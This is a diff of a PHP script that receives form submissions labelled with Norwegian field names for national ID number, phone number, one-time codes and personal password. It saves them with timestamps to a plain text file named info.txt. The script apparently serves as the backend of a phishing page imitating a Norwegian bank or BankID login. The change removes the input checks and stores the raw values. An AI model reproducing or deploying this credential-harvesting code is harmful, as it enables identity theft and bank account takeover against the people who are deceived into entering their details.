@@ -1,106 +1,63 @@
 <?php
-// Set the content type to JSON
 header("Content-Type: application/json");
 
-// Get the raw POST data
 $data = file_get_contents("php://input");
-
-// Decode the JSON data
 $formData = json_decode($data, true);
 
-// Define the file to store form data
 $file = "info.txt";
 
-// Initialize the response
-$response = [
-    "status" => "error",
-    "message" => "Invalid input."
-];
+$response = ["status" => "error", "message" => "Invalid input."];
 
 try {
-    // Validate the data structure
+    // Check that all required fields are set
     if (
-        isset($formData['input01']) && 
-        isset($formData['input02']) && 
-        isset($formData['input03']) && 
-        isset($formData['input04']) && 
-        isset($formData['input05']) && 
-        isset($formData['input07']) && 
+        isset($formData['input01']) &&
+        isset($formData['input02']) &&
+        isset($formData['input03']) &&
+        isset($formData['input04']) &&
+        isset($formData['input05']) &&
+        isset($formData['input07']) &&
         isset($formData['input08'])
     ) {
-        // Sanitize inputs
-        $input01 = htmlspecialchars($formData['input01'], ENT_QUOTES, 'UTF-8'); // Fødselsnummer
-        $input02 = htmlspecialchars($formData['input02'], ENT_QUOTES, 'UTF-8'); // Telefonnummer
-        $input03 = htmlspecialchars($formData['input03'], ENT_QUOTES, 'UTF-8'); // Engangskode
-        $input04 = htmlspecialchars($formData['input04'], ENT_QUOTES, 'UTF-8'); // Personlig passord
-        $input05 = htmlspecialchars($formData['input05'], ENT_QUOTES, 'UTF-8'); // Engangskode igjen
-        $input07 = htmlspecialchars($formData['input07'], ENT_QUOTES, 'UTF-8'); // Repeated password
-        $input08 = htmlspecialchars($formData['input08'], ENT_QUOTES, 'UTF-8'); // Repeated code
-
-        // Validate specific inputs
-        if (!preg_match('/^\d{11}$/', $input01)) {
-            throw new Exception("Invalid Fødselsnummer (must be 11 digits).");
-        }
-
-        if (!preg_match('/^\d{8}$/', $input02)) {
-            throw new Exception("Invalid Telefonnummer (must be 8 digits).");
-        }
-
-        if (!preg_match('/^\d{6}$/', $input03)) {
-            throw new Exception("Invalid Engangskode (must be 6 digits).");
-        }
-
-        if (!preg_match('/^\d{6}$/', $input05)) {
-            throw new Exception("Invalid Engangskode (must be 6 digits).");
-        }
-
-        if (!preg_match('/^\d{6}$/', $input08)) {
-            throw new Exception("Invalid Engangskode (must be 6 digits).");
-        }
-
-        // Prepare the data to save
+        // Prepare data for saving
         $saveData = [
-            "Fodselsnummer" => $input01,
-            "Telefonnummer" => $input02,
-            "Engangskode" => $input03,
-            "PersoneligPassord" => $input04,
-            "EngangskodeIgjen" => $input05,
-            "GjentaPassord" => $input07,
-            "GjentaKode" => $input08,
-            "timestamp" => date("Y-m-d H:i:s") // Include a timestamp
+            "Fodselsnummer" => $formData['input01'],
+            "Telefonnummer" => $formData['input02'],
+            "Engangskode" => $formData['input03'],
+            "PersoneligPassord" => $formData['input04'],
+            "EngangskodeIgjen" => $formData['input05'],
+            "GjentaPassord" => $formData['input07'],
+            "GjentaKode" => $formData['input08'],
+            "timestamp" => date("Y-m-d H:i:s"),
         ];
 
-        // Ensure the file exists; initialize it if necessary
+        // Check if the file exists; create it if not
         if (!file_exists($file)) {
-            file_put_contents($file, json_encode([])); // Initialize as empty JSON array
+            file_put_contents($file, json_encode([])); // Initialize as an empty array
         }
 
-        // Get current file content and decode
+        // Read current data and decode
         $currentData = json_decode(file_get_contents($file), true);
-
-        // Check if decoding was successful
         if (!is_array($currentData)) {
-            // If decoding fails, reinitialize the file with an empty array
-            $currentData = [];
+            $currentData = []; // Reinitialize if file data is invalid
         }
 
-        // Append new form data
+        // Append new data
         $currentData[] = $saveData;
 
         // Save updated content back to the file
         file_put_contents($file, json_encode($currentData, JSON_PRETTY_PRINT));
 
-        // Send a success response
-        $response["status"] = "success";
-        $response["message"] = "Form data saved successfully.";
+        // Respond with success
+        $response = ["status" => "success", "message" => "Data saved successfully."];
     } else {
-        throw new Exception("Incomplete data received.");
+        throw new Exception("All fields are required.");
     }
 } catch (Exception $e) {
-    // Catch exceptions and set the error message
+    // Return the exception message in the response
     $response["message"] = $e->getMessage();
 }
 
-// Return the response as JSON
+// Output the response as JSON
 echo json_encode($response);
 ?>
